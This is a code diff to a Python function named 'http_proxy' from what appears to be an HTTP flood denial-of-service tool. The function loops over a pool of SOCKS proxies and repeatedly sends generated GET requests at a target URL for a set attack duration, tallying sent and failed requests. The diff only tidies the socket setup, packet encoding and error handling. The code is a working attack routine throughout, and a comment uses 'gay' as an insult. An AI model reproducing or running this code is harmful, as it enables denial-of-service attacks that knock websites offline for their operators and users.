@@ -269,16 +269,16 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
     time.sleep(3)
 
     host = urlparse(target_url).netloc
-    port = 443 if target_url.startswith('https://') else 80 if target_url.startswith('http://') else host.split(':')[1] if len(host.split(':')) == 2 else 80
+    port = 443 if target_url.startswith('https://') else 80
 
     stoptime = time.time() + attack_duration
-    s = socks.socksocket()
+    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     while time.time() < stoptime and Core.attackrunning:
         try:
             errcount = 0
             proxip, proxport = choice(Core.proxy_pool).split(':')
 
-            try: s.set_proxy(proto, str(proxip), int(proxport))
+            try: s.set_proxy(proto, proxip, int(proxport))
             except: Core.proxy_pool.delete(f'{proxip}:{proxport}'); continue
 
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -288,15 +288,15 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
 
             # build packet
             headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
-            packet = f'GET /{buildblock("/")} HTTP/1.1\r\n{headers}\r\n'
+            packet = f'GET /{buildblock("/")} HTTP/1.1\r\n{headers}\r\n'.encode()
 
             while Core.attackrunning: # run while we should attack
                 if errcount >= 20: # 20 failed requests, gay
                     break # switch to new proxy
                 try: 
-                    s.send( packet.encode() )
+                    s.send( packet )
                     Core.infodict[worker_id]['req_sent'] += 1
-                except:
+                except Exception:
                     errcount+1
                     Core.infodict[worker_id]['req_fail'] += 1
                 Core.infodict[worker_id]['req_total'] += 1
